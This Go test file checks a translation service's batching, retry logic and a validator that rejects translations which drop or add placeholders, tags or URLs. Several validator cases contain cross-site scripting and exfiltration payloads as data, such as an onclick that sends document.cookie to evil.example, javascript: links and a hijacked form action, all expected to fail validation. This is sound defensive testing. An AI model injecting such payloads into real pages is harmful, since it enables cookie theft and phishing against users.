package translate

import (
	"errors"
	"github.com/hanzoai/cloud/internal/sqltest"
	"net/http"
	"strings"
	"testing"
	"time"
)

// These pin the quality tier's batch safety: a batch is asked for in bounded parts,
// a part that comes back cut short or unusable is asked once more, and a string
// whose translation lost what its source must keep is an error for that string
// alone — never stored, never failing the others.

// TestPlaceholderLossIsRefused: a model that drops {name} every time costs that
// string a second ask, then an error; the string beside it is translated and
// stored, and the failed one is not, so the next call asks for it again.
func TestPlaceholderLossIsRefused(t *testing.T) {
	sqltest.Engines(t, func(t *testing.T, _ sqltest.Open) {
		m := &model{render: func(s string) string { return strings.ReplaceAll(s, "{name}", "") }}
		app := mount(t, m)
		in := Brief{Batch: []string{"Hello {name}", "Goodbye"}, Target: "es"}

		out := translate(t, app, "acme", in)
		lost := out.Translations[0]
		if lost.Error != "the translation lost a placeholder" || lost.Text != "" || lost.Cached {
			t.Fatalf("lost placeholder = %+v", lost)
		}
		if kept := out.Translations[1]; kept.Error != "" || kept.Text != "Goodbye" || kept.State != StateMachine {
			t.Fatalf("the other string = %+v", kept)
		}
		want := Tally{Strings: 2, Translated: 1, Failed: 1, Characters: len("Goodbye")}
		if out.Usage != want {
			t.Fatalf("usage = %+v, want %+v", out.Usage, want)
		}
		// The second ask carried only the string that failed.
		if len(m.inputs) != 2 || len(m.inputs[1]) != 1 || m.inputs[1][0] != "Hello {name}" {
			t.Fatalf("asks = %q, want the batch then the failed string alone", m.inputs)
		}

		again := translate(t, app, "acme", in)
		if again.Translations[0].Cached || !again.Translations[1].Cached {
			t.Fatalf("a failed string was stored, or a good one was not: %+v", again.Translations)
		}
	})
}

// TestPlaceholderRestoredOnTheSecondAsk: a model that drops a tag once and keeps it
// when asked again is a translation, and the span counts the retry.
func TestPlaceholderRestoredOnTheSecondAsk(t *testing.T) {
	sqltest.Engines(t, func(t *testing.T, _ sqltest.Open) {
		asked := 0
		m := &model{render: func(s string) string {
			asked++
			if asked == 1 {
				return "Haz clic aquí"
			}
			return "Haz clic <b>aquí</b>"
		}}
		app := mount(t, m)
		out := translate(t, app, "acme", Brief{Text: "Click <b>here</b>", Target: "es"})
		if got := out.Translations[0]; got.Error != "" || got.Text != "Haz clic <b>aquí</b>" {
			t.Fatalf("translation = %+v", got)
		}
		if m.calls != 2 {
			t.Fatalf("model calls = %d, want 2", m.calls)
		}
	})
}

// TestTruncatedReplyIsAskedAgainThenRefused: a reply cut at its ceiling (finish
// reason "length") is asked for once more; cut again, the string is an error, and
// a call that could return no string at all is 502 translate_failed. Nothing is
// stored.
func TestTruncatedReplyIsAskedAgainThenRefused(t *testing.T) {
	sqltest.Engines(t, func(t *testing.T, _ sqltest.Open) {
		m := &model{render: upper, finish: []string{"length", "length"}}
		app := mount(t, m)
		code, raw := call(t, app, http.MethodPost, "/v1/translate", "acme", Brief{Text: "Hello", Target: "es"})
		if code != http.StatusBadGateway || !strings.Contains(string(raw), `"translate_failed"`) {
			t.Fatalf("twice-truncated reply = %d %s, want 502 translate_failed", code, raw)
		}
		if m.calls != 2 {
			t.Fatalf("model calls = %d, want 2 (one ask, one retry)", m.calls)
		}
		// The finish reasons are spent: the next call is answered whole, by the model.
		out := translate(t, app, "acme", Brief{Text: "Hello", Target: "es"})
		if got := out.Translations[0]; got.Cached || got.Text != "HELLO" {
			t.Fatalf("a truncated answer was stored: %+v", got)
		}
	})
}

// TestTruncatedPartIsAskedForAlone: in a batch of two parts, the part cut short is
// asked for again one string at a time and the other part is not, and every
// string lands.
func TestTruncatedPartIsAskedForAlone(t *testing.T) {
	sqltest.Engines(t, func(t *testing.T, _ sqltest.Open) {
		w := chunkBudget/2 - stringCost
		a, b, c := strings.Repeat("a", w), strings.Repeat("b", w), "c"
		m := &model{render: upper, finish: []string{"length"}}
		app := mount(t, m)
		out := translate(t, app, "acme", Brief{Batch: []string{a, b, c}, Target: "es"})
		if out.Usage.Translated != 3 || out.Usage.Failed != 0 {
			t.Fatalf("usage = %+v, want all three translated", out.Usage)
		}
		if got := sizes(m.inputs); len(got) != 4 || got[0] != 2 || got[1] != 1 || got[2] != 1 || got[3] != 1 {
			t.Fatalf("asks of sizes %v, want [2 1 1 1]: the cut part one string at a time, then the second part", got)
		}
	})
}

func sizes(in [][]string) []int {
	out := make([]int, len(in))
	for i, s := range in {
		out[i] = len(s)
	}
	return out
}

// TestChunksSplitOnTheBudget pins the boundary: strings weighing exactly the budget
// are one part, one byte over is two, and a string heavier than the budget is a
// part of its own, never split.
func TestChunksSplitOnTheBudget(t *testing.T) {
	sqltest.Engines(t, func(t *testing.T, _ sqltest.Open) {
		w := chunkBudget/2 - stringCost
		a, b := strings.Repeat("a", w), strings.Repeat("b", w)
		if got := chunks([]string{a, b}); len(got) != 1 {
			t.Fatalf("exactly the budget = %v, want one part", got)
		}
		if got := chunks([]string{a, b + "b"}); len(got) != 2 || len(got[0]) != 1 || got[1][0] != 1 {
			t.Fatalf("one byte over = %v, want [[0] [1]]", got)
		}
		big := strings.Repeat("c", 2*chunkBudget)
		if got := chunks([]string{"x", big, "y"}); len(got) != 3 {
			t.Fatalf("a string over the budget = %v, want a part of its own", got)
		}
		if got, want := ceiling([]string{a, b}), thinkTokens+2*chunkBudget; got != want {
			t.Fatalf("ceiling of a full part = %d, want %d", got, want)
		}
		if got := ceiling([]string{big}); got != maxCompletion {
			t.Fatalf("ceiling of an oversize string = %d, want the cap %d", got, maxCompletion)
		}
	})
}

// TestEachPartStatesItsCeiling: over the real handler, a batch over the budget is
// two completions, each asking for exactly its own part's ceiling.
func TestEachPartStatesItsCeiling(t *testing.T) {
	sqltest.Engines(t, func(t *testing.T, _ sqltest.Open) {
		w := chunkBudget/2 - stringCost
		batch := []string{strings.Repeat("a", w), strings.Repeat("b", w), "c"}
		m := &model{render: upper}
		app := mount(t, m)
		translate(t, app, "acme", Brief{Batch: batch, Target: "es"})
		if len(m.seen) != 2 {
			t.Fatalf("completions = %d, want 2", len(m.seen))
		}
		for n, want := range []int{ceiling(batch[:2]), ceiling(batch[2:])} {
			if got := m.seen[n].MaxTokens; got != want {
				t.Errorf("part %d MaxTokens = %d, want %d", n, got, want)
			}
		}
	})
}

// TestAFailedPartKeepsThePartsBeforeIt: the engine failing on the second part is a
// 502, but the first part was paid for and is stored, so sending the batch again
// asks only for the rest.
func TestAFailedPartKeepsThePartsBeforeIt(t *testing.T) {
	sqltest.Engines(t, func(t *testing.T, _ sqltest.Open) {
		w := chunkBudget/2 - stringCost
		batch := []string{strings.Repeat("a", w), strings.Repeat("b", w), "c"}
		m := &model{render: upper, err: errors.New("upstream down"), errOn: 2}
		app := mount(t, m)
		if code, raw := call(t, app, http.MethodPost, "/v1/translate", "acme", Brief{Batch: batch, Target: "es"}); code != http.StatusBadGateway {
			t.Fatalf("engine failure = %d %s, want 502", code, raw)
		}
		out := translate(t, app, "acme", Brief{Batch: batch, Target: "es"})
		if out.Usage.Cached != 2 || out.Usage.Translated != 1 {
			t.Fatalf("usage = %+v, want the first part from memory and the rest translated", out.Usage)
		}
	})
}

// TestKeptNamesWhatWasLost covers what a translation must keep — placeholders,
// printf conversions, ICU arguments and their selectors, tags and their links,
// URLs — and what it may change: the words inside them, an attribute's words, the
// plural branches a language's rules add. The reason names the class, never the
// token: it is the caller's text.
func TestKeptNamesWhatWasLost(t *testing.T) {
	sqltest.Engines(t, func(t *testing.T, _ sqltest.Open) {
		plural := "{count, plural, one {# file} other {# files}}"
		for _, tc := range []struct{ source, translation, want string }{
			{"Hi {name}", "Hola {name}", ""},
			{"Hi {name}", "Hola", "the translation lost a placeholder"},
			{"Hi {name}", "Hola {name} {extra}", "the translation added a placeholder"},
			{"Hello {Name}", "Hola {name}", "the translation lost a placeholder"},
			{"Hi {{user}}, {0}", "Hola {{user}}, {0}", ""},
			{"Hello %s, you have %d items", "Hola %s, tienes %d artículos", ""},
			{"Hello %s, you have %d items", "Hola, tienes artículos", "the translation lost a placeholder"},
			{"50% off, %d left", "50% de descuento, quedan %d", ""},
			{plural, "{count, plural, one {# archivo} other {# archivos}}", ""},
			{plural, "{count, plural, one {# файл} few {# файла} many {# файлов} other {# файла}}", ""},
			{plural, "# archivos", "the translation lost an ICU argument"},
			{plural, "{count, plural, one {un archivo} other {archivos}}", "the translation lost an ICU argument"},
			{"Click <b>here</b>", "Haz clic <b>aquí</b>", ""},
			{"Click <b>here</b>", "Haz clic aquí", "the translation lost a markup tag"},
			{`<img alt="A cat">`, `<img alt="Un gato">`, ""},
			{"See https://hanzo.ai/docs.", "Consulta https://hanzo.ai/docs。", ""},
			{"[Docs](https://hanzo.ai/docs)", "[Documentos](https://hanzo.ai/docs)", ""},
			{"See https://hanzo.ai/docs", "Ver https://hanzo.ai/es/docs", "the translation lost a URL"},
			{"مرحبا {name}", "\u200f{name}\u200f مرحبا", ""},
			{"plain", "llano", ""},
			// The words in an ICU branch are words: translated, not kept.
			{"{count, plural, one {file} other {files}}", "{count, plural, one {archivo} other {archivos}}", ""},
			{"{gender, select, male {He} female {She} other {They}} replied", "{gender, select, male {Él} female {Ella} other {Elle}} respondió", ""},
			{"{n, plural, one {item} other {items}}", "{n, plural, one {item} few {items} many {items} other {items}}", ""},
			{"{count, plural, one {{name} has a file} other {{name} has # files}}", "{count, plural, one {{name} tiene un archivo} other {{name} tiene # archivos}}", ""},
			// Its structure is not: a select's keys, a plural's exact matches, # and the
			// arguments inside its branches.
			{"{gender, select, male {He} female {She} other {They}}", "{gender, select, male {Él} other {Elle}}", "the translation lost an ICU argument"},
			{"{n, plural, =0 {no files} other {# files}}", "{n, plural, other {# archivos}}", "the translation lost an ICU argument"},
			{"{count, plural, other {{name} has # files}}", "{count, plural, other {tiene # archivos}}", "the translation lost a placeholder"},
			// A tag or URL the source does not have, or a link that moved, is as wrong as
			// one that went missing.
			{"Click <b>here</b>", `Haz clic <b>aquí</b><script>fetch("//evil")</script>`, "the translation added a markup tag"},
			{`Click <a href="https://hanzo.ai/pay">here</a>`, `Haz clic <a href="javascript:alert(1)" title="https://hanzo.ai/pay">aquí</a>`, "the translation lost a markup tag"},
			{"Read the docs", "Lee https://evil.example/login la documentación", "the translation added a URL"},
			// Red's second review, kept as regressions.
			{"{n, selectordinal, one {#st} two {#nd} few {#rd} other {#th}}", "{n, selectordinal, other {#.}}", ""},
			{"{n, plural, one {# file} other {# files}}", "{n, plural, one {un archivo} other {archivos}}", "the translation lost an ICU argument"},
			{"Click <b>here</b>", "Haz clic <b>aquí</b><i>ya</i>", "the translation added a markup tag"},
			{`<a href="https://hanzo.ai/pay">here</a>`, `<a href="https://evil.example/pay">aquí</a>`, "the translation lost a markup tag"},
			{"{n, plural, =0 {none} other {# files}}", "{n, plural, =1 {uno} other {# archivos}}", "the translation lost an ICU argument"},
			{"{n, plural, other {# files}}", "{n, selectordinal, other {# archivos}}", "the translation lost an ICU argument"},
			// A tag's attributes are its shape, read as a browser reads them: an added
			// handler, a moved action, or a real link hidden in a quoted title fails;
			// only alt, title, aria-label and placeholder are words.
			{`<a href="https://hanzo.ai/pay">here</a>`, `<a href="https://hanzo.ai/pay" onclick="fetch('//evil.example/'+document.cookie)">aquí</a>`, "the translation lost a markup tag"},
			{`<img src="/logo.png" alt="Logo">`, `<img src="/logo.png" alt="Logo" onerror="alert(document.domain)">`, "the translation lost a markup tag"},
			{`<a href="https://hanzo.ai/pay">here</a>`, `<a href="javascript:alert(1)" title="<a href='https://hanzo.ai/pay'>">aquí</a>`, "the translation lost a markup tag"},
			{`<form action="https://hanzo.ai/login">Sign in</form>`, `<form action="//evil.example/login" title="https://hanzo.ai/login">Entrar</form>`, "the translation lost a markup tag"},
			{`<a href="/docs" title="Docs">Docs</a>`, `<a href="/docs" title="Documentos">Documentos</a>`, ""},
			{`<a href="/docs">Docs</a>`, `<a href="java&#x09;script:alert(1)">Docs</a>`, "the translation lost a markup tag"},
			{"[Docs](/docs)", "[Docs](javascript:alert(1))", "the translation lost a URL"},
			{"![Logo](/logo.png)", "![Logotipo](/logo.png)", ""},
			// printf conversions fill their arguments in order.
			{"%s has %d items", "%d 個のアイテムが %s にあります", "the translation lost a placeholder"},
			{"%s and %s", "%s", "the translation lost a placeholder"},
			{"Hello %@", "Hola %@ %@", "the translation lost a placeholder"},
			{"%1$s has %2$d items", "%2$d 個のアイテムが %1$s にあります", ""},
			{"100%% of %s", "100%% de %s", ""},
			// A plural needs other, and only CLDR's categories.
			{"{n, plural, one {# file} other {# files}}", "{n, plural, one {# archivo}}", "the translation lost an ICU argument"},
			{"{n, plural, one {# file} other {# files}}", "{n, plural, one {# archivo} bogus {x} other {# archivos}}", "the translation lost an ICU argument"},
			// Every branch keeps the arguments every source branch holds.
			{"{count, plural, one {{name} has a file} other {{name} has # files}}", "{count, plural, one {tiene un archivo} other {{name} tiene # archivos}}", "the translation lost an ICU argument"},
			// An apostrophe is text, as in most catalogs, not ICU's quote.
			{"Hi {name}", "Hola '{name}'", ""},
		} {
			if got := kept(tc.source, tc.translation); got != tc.want {
				t.Errorf("kept(%q, %q) = %q, want %q", tc.source, tc.translation, got, tc.want)
			}
		}
	})
}

// TestShapeIsOnePass: reading a string's shape costs what its length costs —
// unmatched braces, deep nesting and noise alike — so no string can hold a
// request on the reader. The inputs are a whole request's worth, where a reader
// that searched for each brace's match took seconds (and nested arguments, ever),
// and a one-pass reader takes milliseconds: the bound sits between the two, wide
// enough for a loaded box.
func TestShapeIsOnePass(t *testing.T) {
	sqltest.Engines(t, func(t *testing.T, _ sqltest.Open) {
		noise := make([]byte, maxTotal)
		alphabet := "{}#,' a=pluralselect<>\"/%"
		for i := range noise {
			noise[i] = alphabet[(i*7919+i/13)%len(alphabet)]
		}
		for name, s := range map[string]string{
			"open braces":      strings.Repeat("{", maxTotal),
			"close braces":     strings.Repeat("}", maxTotal),
			"open then close":  strings.Repeat("{", maxTotal-1) + "}",
			"nested select":    strings.Repeat("{a, select, x {", maxChars/16) + strings.Repeat("}}", maxChars/16),
			"nested plural":    strings.Repeat("{n, plural, one {# ", maxChars/20) + strings.Repeat("}}", maxChars/20),
			"nested braces":    strings.Repeat("{a", maxChars/2) + strings.Repeat("}", maxChars/2),
			"open tags":        strings.Repeat(`<a b="`, maxChars/6),
			"noise":            string(noise),
			"plain brace":      "Price: { 5 } and { more",
			"empty select":     "{a, select, {x} {y}}",
			"offset only":      "{n, plural, offset:1 offset:2}",
			"trailing comma":   "{n, plural, }",
			"unterminated sel": "{n, select, male {He",
		} {
			done := make(chan time.Duration, 1)
			go func() {
				start := time.Now()
				_ = shapeOf(s)
				done <- time.Since(start)
			}()
			select {
			case took := <-done:
				if took > 2*time.Second {
					t.Errorf("%s (%d bytes): %s to read", name, len(s), took)
				}
			case <-time.After(30 * time.Second):
				t.Fatalf("%s (%d bytes): still reading after 30s", name, len(s))
			}
		}
	})
}
